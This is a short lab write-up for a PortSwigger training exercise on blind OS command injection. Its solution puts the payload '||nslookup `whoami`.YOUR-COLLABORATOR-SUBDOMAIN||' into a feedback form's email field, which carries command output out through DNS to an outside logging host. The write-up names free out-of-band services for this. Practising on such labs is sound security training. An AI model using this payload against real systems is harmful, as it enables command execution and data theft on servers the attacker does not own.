# Lab 06 — Blind OS command injection with out-of-band data exfiltration

> **Expert** · [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

**Entry point:** `POST /feedback` (`email` field) · **Goal:** exfiltrate

> **Burp Community alternative (free):** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
`whoami` through a DNS subdomain.

## Solution

1. Backtick-substitute the command output into the lookup:

```
email=||nslookup+`whoami`.YOUR-COLLABORATOR-SUBDOMAIN||
```

2. **Poll now** → the interaction's Description shows the full domain:
   `carlos.YOUR-COLLABORATOR-SUBDOMAIN` — the subdomain **is** the command
   output.
3. Submit `carlos` — lab solved.

## Notes

Backticks nest command execution inside the argument; DNS labels carry the
data out with no inbound firewall needed.
